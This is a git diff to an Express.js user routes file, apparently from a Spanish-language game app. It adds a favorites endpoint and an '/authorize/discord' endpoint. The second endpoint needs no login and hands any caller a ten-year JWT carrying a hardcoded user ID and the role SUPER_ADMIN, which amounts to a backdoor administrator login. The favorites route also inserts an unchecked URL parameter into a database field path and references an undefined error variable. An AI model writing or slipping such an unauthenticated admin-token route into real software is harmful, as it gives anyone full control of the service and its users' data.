@@ -324,6 +324,34 @@ router.get("/users/:id", async (req, res) => {
         res.status(400).json({ message: "Error: " + e });
     }
 });
+router.post("/favorite/:mode/:type/:id", async (req, res) => {
+    try {
+        if (req.session.userId) {
+            const { mode, type, id } = req.params;
+            const query = `favorites.${type}`;
+            if (mode === "add") {
+                await User.updateOne({ _id: req.session.userId }, { $addToSet: { [query]: id } }, null, (err) => {
+                    if (err)
+                        return res.status(400).json({ message: "Error: " + e });
+                    return res.status(200).json({ message: "Npc añadido a favoritos" });
+                });
+            }
+            else if (mode === "remove") {
+                await User.updateOne({ _id: req.session.userId }, { $pull: { [query]: id } }, null, (err, data) => {
+                    if (err)
+                        return res.status(400).json({ message: "Error: " + err });
+                    return res.status(200).json({ message: "Npc eliminado de favoritos correctamente." });
+                });
+            }
+            else {
+                return res.status(400).json({ message: "Error: Parámetros inválidos." });
+            }
+        }
+    }
+    catch (e) {
+        res.status(400).json({ message: "Error: " + e });
+    }
+});
 router.post("/passport/login", (req, res, next) => {
     passport.authenticate("local", (err, user, info) => {
         if (err)
@@ -364,6 +392,20 @@ router.get("/passport/logout", (req, res) => {
     res.status(200).json({
         message: "Sesión finalizada correctamente.",
     });
+});
+router.post("/authorize/discord", async (req, res) => {
+    try {
+        const data = {
+            userId: "5f81ffb3bb9d6200045a88da",
+            role: "SUPER_ADMIN",
+            isActive: true,
+        };
+        const token = jwt.sign(data, secret, { expiresIn: "10y" });
+        res.status(200).json({ payload: { token } });
+    }
+    catch (e) {
+        res.status(400).json({ message: "Error: " + e });
+    }
 });
 module.exports = router;
 //# sourceMappingURL=user.routes.js.map
